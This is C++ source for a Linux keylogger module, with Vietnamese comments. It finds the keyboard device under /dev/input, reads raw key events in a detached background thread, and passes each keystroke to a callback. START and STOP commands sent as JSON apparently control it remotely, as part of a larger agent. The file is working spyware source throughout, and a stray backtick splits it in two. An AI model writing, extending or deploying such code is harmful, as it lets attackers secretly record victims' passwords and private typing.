#include "KeyManager.hpp"
#include <iostream>

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");
    
    if (command == "START") {
        start_hook();
        return {
            {"status", "success"}, 
            {"module", get_module_name()},
            {"data", "Keylogger started"}};
    }
    if (command == "STOP") {
        stop_hook();
        return {
            {"status", "success"}, 
            {"module", get_module_name()},
            {"error", "Keylogger stopped"}};
    }

    return {
        {"status", "error"}, 
        {"module", get_module_name()},
        {"error", "Unknown command"}};
}
`
static KeyCallback g_callback = nullptr;
static std::atomic<bool> g_running{false};
static int g_fd = -1; // File descriptor của thiết bị bàn phím

static std::map<int, std::string> g_keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"}, {KEY_Z, "z"},
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    {KEY_ENTER, "[ENTER]\n"}, {KEY_SPACE, " "}, {KEY_BACKSPACE, "[BACKSPACE]"},
    {KEY_TAB, "[TAB]"}, {KEY_ESC, "[ESC]"}, {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
    {KEY_DOT, "."}, {KEY_COMMA, ","}, {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
    {KEY_SLASH, "/"}, {KEY_SEMICOLON, ";"}
};

std::string find_keyboard_device() {
    const std::string path_dir = "/dev/input/by-path/";
    DIR* dir = opendir(path_dir.c_str());
    if (!dir) return "";

    struct dirent* entry;
    std::string device_path = "";

    while ((entry = readdir(dir)) != NULL) {
        std::string filename = entry->d_name;
        // Tìm file kết thúc bằng "-event-kbd"
        if (filename.length() > 10 && 
            filename.substr(filename.length() - 10) == "-event-kbd") {
            device_path = path_dir + filename;
            break;
        }
    }
    closedir(dir);
    
    if (device_path.empty()) return "/dev/input/event0";
    return device_path;
}

void hook_loop() {
    std::string dev_path = find_keyboard_device();

    g_fd = open(dev_path.c_str(), O_RDONLY);
    if (g_fd == -1) {
        g_running = false;
        return;
    }

    struct input_event ev;
    int i = 0;
    
    while (g_running) {
        std::cout << i++ << "\n"; 
        ssize_t n = read(g_fd, &ev, sizeof(ev));
        if (n == (ssize_t)-1 || !g_running) {
            break; 
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            if (g_keyMap.count(ev.code)) {
                std::string key = g_keyMap[ev.code];
                
                if (g_callback) {
                    g_callback(key);
                }
            }
        }
    }

    if (g_fd != -1) {
        close(g_fd);
        g_fd = -1;
    }
}

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

void KeyManager::start_hook() {
    if (g_running) return; // Đang chạy rồi thì bỏ qua
    
    g_running = true;
    
    hookThread = std::thread(hook_loop);
    hookThread.detach(); // Tách thread để nó chạy ngầm
}

void KeyManager::stop_hook() {
    if (!g_running) return;

    g_running = false;

    if (g_fd != -1) {
        close(g_fd); // Dòng này sẽ làm lệnh read() bên kia trả về lỗi và thoát vòng lặp
        g_fd = -1;
    }
}
